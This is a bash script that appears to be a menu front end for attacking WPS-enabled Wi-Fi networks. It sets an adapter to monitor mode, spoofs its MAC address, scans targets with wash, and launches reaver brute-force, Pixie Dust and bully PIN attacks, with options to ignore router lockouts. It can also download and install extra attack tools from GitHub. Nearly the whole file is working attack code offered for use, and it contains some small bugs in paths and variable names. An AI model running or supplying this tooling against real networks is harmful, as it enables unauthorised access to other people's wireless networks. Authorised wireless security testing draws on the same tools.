#! /bin/bash

#############DEFAULTS###############

#setting yellow-start 
YS="\e[1;33m"
#setting color-end
CE="\e[0m"
#setting red-start
RS="\e[1;31m"
#setting frequent stings
YNYES="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=yes)"
YNNO="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=no)"
YNONLY="("$YS"y"$CE"/"$YS"n"$CE")"
PAKT="Press "$YS"any key$CE to"
PAKTC="Press "$YS"any key$CE to continue..."
PAKTGB="Press "$YS"any key$CE to go back..."
READAK="read -n 1"
####################################
WLANNM=$(cat /root/mscript/wlanmon.txt)
export WLANNM
SCW=1
function enable2_wlan
{
	echo -e "Enabling $WLANN..."
	rfkill unblock wifi &> /dev/null; rfkill unblock all &> /dev/null
	ifconfig $WLANN up &>/dev/null && echo -e ""$YS"Done"$CE"" && O4=1  || echo -e ""$RS"Error. I can't find your wireless adapter"$CE""
}
function start2_menu
{
	echo -e "Enabling $WLANNM..."
	enable2_wlan
	echo -e "Killing services..."
	airmon-ng check kill &> /dev/null && echo -e ""$YS"Done"$CE"" && O1=1
	echo -e "Starting monitor mode..."
	if [[ "$ALFA" = "yes" ]]
	then
		ifconfig $WLANN down
		iwconfig $WLANN mode monitor &> /dev/null && echo -e ""$YS"Done"$CE"" && O2=1
		ifconfig $WLANN up
	else
		airmon-ng start $WLANN | grep "monitor mode" | awk -F "(" {'print $2'} | cut -d ')' -f1 &> /dev/null && echo -e ""$YS"Done"$CE"" && O2=1
	fi
	echo -e "Changing mac address of $WLANNM to 00:11:22:33:44:55..."
	ifconfig $WLANNM down
	macchanger -m 00:11:22:33:44:55 $WLANNM | grep "New MAC:" &> /dev/null && O3=1
	ifconfig $WLANNM up && echo -e ""$YS"Done"$CE"" 
}
function stop2_menu
{
	stop2_monitor
	echo -e "Changing mac address of $WLANN to the original one..."
	ifconfig $WLANN down
	macchanger -p $WLANN | grep "Current MAC:" && O1=1
	ifconfig $WLANN up
	echo -e ""$YS"Done"$CE""
}
function stop2_monitor
{
	echo -e "Disabling $WLANNM..."
	echo -e "Stopping monitor mode..."
	if [[ "$ALFA" = "yes" ]]
	then
		A1=0
		A2=0
		A3=0
		ifconfig $WLANN down && A1=1
		iwconfig $WLANN mode managed && A2=1
		ifconfig $WLANN up && A3=1
		if [[ "$A1" = 1 && "$A2" = 1 && "$A3" = 1 ]]
		then
			echo -e ""$YS"Done"$CE"" && O2=1
		else
			echo -e ""$RS"Error stoping monitor mode."$CE""
		fi
	else
		airmon-ng stop $WLANNM &>/dev/null && echo -e ""$YS"Done"$CE"" && O2=1 || echo -e ""$RS"Error stoping monitor mode."$CE""
	fi
	echo -e "Starting network-manager service..."
	service network-manager start && echo -e ""$YS"Done"$CE"" && O3=1 || echo -e ""$RS"Error starting network-manager service"$CE""
}
function install_bully
{
	if [[ -d "/root/bully" ]]
	then
		echo -e "Removing old..."
		echo -e "$PAKTC"
		$READAK
		rm -r /root/bully
	fi				
	echo -e "Installing Bully"
	echo -e "Tool by Aanarchyy"
	cd
	git clone https://github.com/aanarchyy/bully.git
	cd /root/bully/src
	make
	sudo make install	
	cd	
}
function install_wifiautopwner
{
	if [[ -d "/root/WiFi-autopwner" ]]
	then
		echo -e "Removing old..."
		echo -e "$PAKTC"
		$READAK
		rm -r /root/WiFi-autopwner
	fi		
	echo -e "Installing WiFi-autopwner"
	echo -e "Tool by Mi-Al"
	cd
	git clone https://github.com/Mi-Al/WiFi-autopwner.git
}
function dash_calc
{
	
	size=${#TERMINALTITLE}
	calc=$(( 65-size ))
	calc=$(( calc/2 ))
	numcalc=1
	DASHESN="-"
	while [ $numcalc != $calc ]
	do
		DASHESN=""$DASHESN"-"
		numcalc=$(( numcalc+1 ))
	done
	echo -e "$DASHESN"$RS"$TERMINALTITLE"$CE"$DASHESN"
}
function scan_wash
{
	while true
	do
	if [[ "$SCW" != 0 ]]
	then
		clear
		echo -e "Scaning in new terminal..."
		echo -e ""$YS"PRESS CTRL C IN WASH WHEN READY."$CE""
		sleep 1
		xterm -geometry 80x25+9999+9999 -e "wash  -i $WLANNM | tee /root/mscript/tempwash "
	fi
		SCW=1
		clear
		wash_awk
		if [[ "$lines" = 0 ]]
		then
			echo -e ""$RS"No networks with WPS found nearby"$CE""
		fi
		echo -e ""$YS" r"$CE") Rescan"
		echo -e ""$YS" b"$CE") Go back"
		echo -e "Choose: "
		read WASHSCAN
		if [[ "$WASHSCAN" = "r" ]]
		then
			continue
		elif [[ "$WASHSCAN" = "back" || "$WASHSCAN" = "b" ]]
		then
			SCW=0
			break
		else
			WASHSCAN2=${nnum[$WASHSCAN]}
			BSSIDT="${abssid[$WASHSCAN2]}"
			CHANT="${achannel[$WASHSCAN2]}"
			ESSIDT="${aessid[$WASHSCAN2]}"
			while true
			do
				clear
				echo -e ""$RS"----------You need strong connection------------"$CE""
				echo -e ""$YS" 1"$CE") Pixie dust       fast"
				echo -e ""$YS" 2"$CE") Bruteforse       slow"
				echo -e ""$YS" 3"$CE") Bully            fast+automated"
				echo -e ""$YS" r"$CE") Rescan"
				echo -e ""$YS" b"$CE") Go back"
				echo -e "Choose: "
				read WPSL
				if [[ "$WPSL" = "r" ]]
				then
					RESCAN=1
					SCW=1
					break
				elif [[ "$WPSL" = "back" || "$WPSL" = "b" ]]
				then
					RESCAN=1
					SCW=0
					break
				elif [[ "$WPSL" = "1" ]]
				then
					pixie_attack
				elif [[ "$WPSL" = "2" ]]
				then
					reaver_attack
				elif [[ "$WPSL" = "3" ]]
				then
					bully_script
				fi
			done
			if [[ "$RESCAN" = 1 ]]
			then
				RESCAN=0
				continue
			else
				break
			fi
		fi
	done
}
function reaver_attack
{
	clear
	xterm -geometry 90x70+0+0 -e "sleep 5 && aireplay-ng $WLANNM -1 120 -a $BSSIDT" & disown
	reaver -i $WLANNM -b $BSSIDT -c $CHANT -v -N -A | tee /root/mscript/wpslog
	echo -e "Press "$YS"enter"$CE" to go back"
	read	
}
function pixie_attack
{
	clear
	xterm -geometry 90x70+0+0 -e "sleep 5 && aireplay-ng $WLANNM -1 10 -a $BSSIDT" & disown
	reaver -i $WLANNM -b $BSSIDT -c $CHANT -K 1 -S -N -A -vvv | tee /root/mscript/wpslog
	echo -e "Press "$YS"enter"$CE" to go back"
	read
}
function reaver_wpastart
{
	reaver -i $WLANNM -b $BSSIDT -c $CHANT -p $WPST -vv
	echo -e "$PAKTC"
	read
}
function associate_aireplay
{
	echo -e "Enter your target's BSSID: "
	read -e BSSIDT
	export BSSIDT
	export -f aireplay_command
	xterm -e bash -c 'aireplay_command; exec bash'
	clear
	exec bash "$0"
}
function wash_awk
{
file="/root/mscript/tempwash"
linestotal=$(cat $file | awk 'END{print NR}')
lines=$((linestotal-7))
n=1
if [[ "$lines" != 0 ]]
then
	echo -e "    BSSID             CH ESSID"
fi
while [ $n -le "$lines" ]
do
	nnn=$((n+7))
	nnum[$n]=$nnn
	abssid[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $1}')
	achannel[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $2}')
	aessid[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $6}')
	alock[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $5}')
	if [[ $alock[$nnn] = "No" ]]
	then
		locked="$RS"
	else
		locked="$YS"
	fi
	size=${#achannel[$nnn]}
	if [[ "$n" -le 9 ]]
	then
		if [[ "$size" = 2 ]]
		then
			echo -e " "$locked""$n""$CE") "$locked"${abssid[$nnn]} ${achannel[$nnn]} ${aessid[$nnn]}"$CE""
		else
			echo -e " "$locked""$n""$CE") "$locked"${abssid[$nnn]} ${achannel[$nnn]}  ${aessid[$nnn]}"$CE""
		fi
	else
		if [[ "$size" = 2 ]]
		then
			echo -e ""$locked""$n""$CE") "$locked"${abssid[$nnn]} ${achannel[$nnn]} ${aessid[$nnn]}"$CE""
		else
			echo -e ""$locked""$n""$CE") "$locked"${abssid[$nnn]} ${achannel[$nnn]}  ${aessid[$nnn]}"$CE""
		fi
	fi
	n=$(( n+1 ))
done
}
function bully_script
{
printf '\033]2;BULLY AUTOMATION\a'
while true
do
	clear
	if [[ "$BRUTE" = "" ]]
	then
		BRUTE="OFF"
	fi
	if [[ "$FORCE" = "" ]]
	then
		FORCE="OFF"
	fi
	if [[ "$PIXIE" = "" ]]
	then
		PIXIE="ON"
	fi
	if [[ "$SEQ" = "" ]]
	then
		SEQ="OFF"
	fi
	if [[ "$VERBOSITY" = "" ]]
	then
		VERBOSITY=3
	fi
	if [[ "$IGNORELOCKOUT" = "" ]]
	then
		IGNORELOCKOUT="OFF"
	fi
	if [[ "$LOCKWAIT" = "" ]]
	then
		LOCKWAIT=60
	fi
	if [[ "$WAITPERATTEMPT" = "" ]]
	then
		WAITPERATTEMPT=0
	fi
	if [[ "$BSSIDT" = "" || "$ESSIDT" = "" || "$CHANT" = "" ]]
	then
		OK=0
	else
		OK=1
	fi
	echo -e ""$YS" 1"$CE") Essid                       CURRENT:"$ESSIDT""
	echo -e ""$YS" 2"$CE") Bssid                       CURRENT:"$BSSIDT""
	echo -e ""$YS" 3"$CE") Channel                     CURRENT:"$CHANT""
	echo -e ""$YS" 4"$CE") Bruteforce Checksum digit   CURRENT:"$BRUTE""
	echo -e ""$YS" 5"$CE") Pixie wps                   CURRENT:"$PIXIE""
	echo -e ""$YS" 6"$CE") Wait after lock             CURRENT:"$LOCKWAIT" secs"
	echo -e ""$YS" 7"$CE") Wait per attempt            CURRENT:"$WAITPERATTEMPT" secs"
	echo -e ""$YS" 8"$CE") Force                       CURRENT:"$FORCE""
	echo -e ""$YS" 9"$CE") Sequential                  CURRENT:"$SEQ""
	echo -e ""$YS"10"$CE") Verbosity                   CURRENT:"$VERBOSITY""
	echo -e ""$YS"11"$CE") Ignore lockout              CURRENT:"$IGNORELOCKOUT""
	echo -e ""$YS" b"$CE") Go back"
	echo -e ""$YS"start"$CE") Start"
	echo -e "Choose: "
	read B
	clear
	if [[ "$B" = "back" || "$B" = "b" ]]
	then
		clear
		break
	elif [[ "$B" = "start" ]]
	then
		if [[ "$OK" = 0 ]]
		then
			echo -e ""$RS"Error 1"$CE""
			sleep 3
		else
			if [[ "$BRUTE" = "ON" ]]
			then
				LBRUTE="-B"
			else
				LBRUTE=""
			fi
			if [[ "$PIXIE" = "ON" ]]
			then
				LPIXIE="-d"
			else
				LPIXIE=""
			fi
			if [[ "$FORCE" = "ON" ]]
			then
				LFORCE="-F"
			else
				LFORCE=""
			fi
			if [[ "$SEQ" = "ON" ]]
			then
				LSEQ="-S"
			else
				LSEQ=""
			fi
			LVERBOSITY="-v $VERBOSITY"
			if [[ "$IGNORELOCKOUT" = "ON" ]]
			then
				LIGNORELOCKOUT="-L"
			else
				LIGNORELOCKOUT=""
			fi
			bully -b $BSSIDT -e $ESSIDT -c $CHANT -v $VERBOSITY -l $LOCKWAIT -1 $WAITPERATTEMPT,1 $LFORCE $LSEQ $LBRUTE $LPIXIE $LIGNORELOCKOUT $WLANNM
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [[ "$B" = 1 ]]
	then
		echo -e "Essid:"
		read ESSIDT
	elif [[ "$B" = 2 ]]
	then
		echo -e "Bssid:"
		read BSSIDT
	elif [[ "$B" = 3 ]]
	then
		echo -e "Channel:"
		read CHANT
	elif [[ "$B" = 4 ]]
	then
		if [[ "$BRUTE" = "ON" ]]
		then
			BRUTE="OFF"
		else
			BRUTE="ON"
		fi
	elif [[ "$B" = 5 ]]
	then
		if [[ "$PIXIE" = "ON" ]]
		then
			PIXIE="OFF"
		else
			PIXIE="ON"
		fi
	elif [[ "$B" = 6 ]]
	then
		echo -e "Wait after lock(in seconds): "
		read LOCKWAIT
	elif [[ "$B" = 7 ]]
	then
		echo -e "Wait per attempt(in seconds): "
		read WAITPERATTEMPT
	elif [[ "$B" = 8 ]]
	then
		if [[ "$FORCE" = "ON" ]]
		then
			FORCE="OFF"
		else
			FORCE="ON"
		fi
	elif [[ "$B" = 9 ]]
	then
		if [[ "$SEQ" = "ON" ]]
		then
			SEQ="OFF"
		else
			SEQ="ON"
		fi
	elif [[ "$B" = 10 ]]
	then
		while true
		do
			echo -e "Verbosity (1-4): "
			read VERB
			clear
			if [[ "$VERB" = 1 || "$VERB" = 2 || "$VERB" = 3 || "$VERB" = 4 ]]
			then
				VERBOSITY="$VERB"
				break
			else
				echo -e "Number must be 1,2,3 or 4"
				sleep 3
			fi			
		done
	elif [[ "$B" = 11 ]]
	then
		if [[ "$IGNORELOCKOUT" = "ON" ]]
		then
			IGNORELOCKOUT="OFF"
		else
			IGNORELOCKOUT="ON"
		fi
	fi
	
done
}
function main_wps_options
{
while true
do
clear
TERMINALTITLE="WPS PIN"
dash_calc
printf '\033]2;WPS PIN\a'
if [[ "$ESSIDT" = "" ]]
then
	echo -e ""$YS" 1"$CE") Scan with wash         Selected: "$RS"None"$CE""
else
	echo -e ""$YS" 1"$CE") Scan with wash         Selected: "$YS"$ESSIDT"$CE""
fi
echo -e ""$YS" 2"$CE") Reaver bruteforce"
echo -e ""$YS" 3"$CE") Reaver                 (if you already have the WPS pin)"
echo -e ""$YS" 4"$CE") Pixie Dust"
if [[ -f /usr/bin/bully ]]
then
	echo -e ""$YS" 5"$CE") Bully                  AUTOMATED SCRIPT"
	echo -e ""$YS" 6"$CE") Bully"
else
	echo -e ""$RS" 5"$CE") "$RS"Bully"$CE"                   AUTOMATED SCRIPT"
	echo -e ""$RS" 6"$CE") "$RS"Bully"$CE""
fi
if [[ -d /root/WiFi-autopwner ]]
then
	echo -e ""$YS" 7"$CE") WiFi autopwner"
else
	echo -e ""$RS" 7"$CE") "$RS"WiFi autopwner"$CE""
fi
echo -e ""$YS" 8"$CE") See latest log"
echo -e ""$YS" 0"$CE") Exit"
echo -e "Choose: "
read -e YN
clear
if [[ "$YN" = "1" ]]
then
	scan_wash
elif [[ "$YN" = "2" ]]
then
	if [[ "$ESSIDT" != "" ]]
	then
		reaver_attack
	else
		echo -e ""$RS"No network selected"$CE""
		sleep 2
	fi
elif [[ "$YN" = "3" ]]
then
	if [[ "$ESSIDT" != "" ]]
	then
		echo -e "Enter your target's WPS pin: "
		read -e WPST
		clear
		reaver -i $WLANNM -b $BSSIDT -c $CHANT -p $WPST -vv | tee /root/mscript/wpslog
		echo -e "Press "$YS"enter"$CE" to go back"
		read
	else
		echo -e ""$RS"No network selected"$CE""
		sleep 2
	fi

elif [[ "$YN" = "4" ]]
then
	if [[ "$ESSIDT" != "" ]]
	then
		pixie_attack
	else
		echo -e ""$RS"No network selected"$CE""
		sleep 2
	fi
elif [[ "$YN" = "5" ]]
then
	if [[ -f /usr/bin/bully ]]
	then
		if [[ "$ESSIDT" != "" ]]
		then
			bully_script
		else
			echo -e ""$RS"No network selected"$CE""
			sleep 2
		fi
	else
		echo -e ""$RS"Bully isn't installed.Type '"$CE""$YS"install"$CE""$RS"' to stop monitor mode and install it."$CE""
		read INSTALL
		if [[ "$INSTALL" = "install" ]]
		then
			stop2_menu
			echo -e "Press "$YS"enter"$CE" when connected to a network"
			read ENT
			install_bully
			start2_menu
		fi
	fi
elif [[ "$YN" = "6" ]]
then
	if [[ -f /root/bully/src/bully.py ]]
	then
		cd /root/bully/src
		./bully.py
		cd
	else
		echo -e ""$RS"Bully isn't installed.Type '"$CE""$YS"install"$CE""$RS"'to stop monitor mode and install it."$CE""
		read INSTALL
		if [[ "$INSTALL" = "install" ]]
		then
			stop2_menu
			echo -e "Press "$YS"enter"$CE" when connected to a network"
			read ENT
			install_bully
			start2_menu
		fi
	fi
elif [[ "$YN" = "7" ]]
then
	if [[ -f /root/WiFi-autopwner/wifi-autopwner.s ]]
	then
		cd /root/WiFi-autopwner
		./wifi-autopwner.sh
		cd
	else
		echo -e ""$RS"Wifi autopwner isn't installed.Type '"$CE""$YS"install"$CE""$RS"' to stop monitor mode and install it."$CE""
		read INSTALL
		if [[ "$INSTALL" = "install" ]]
		then
			stop2_menu
			echo -e "Press "$YS"enter"$CE" when connected to a network"
			read ENT
			install_wifiautopwner
			start2_menu
		fi
	fi
elif [[ "$YN" = "8" ]]
then
	cat /root/mscript/wpslog
	echo -e "Press "$YS"enter"$CE" to go back"
	read
elif [[ "$YN" = "0" ]]
then
	exit
fi
done
}

####################################
main_wps_options
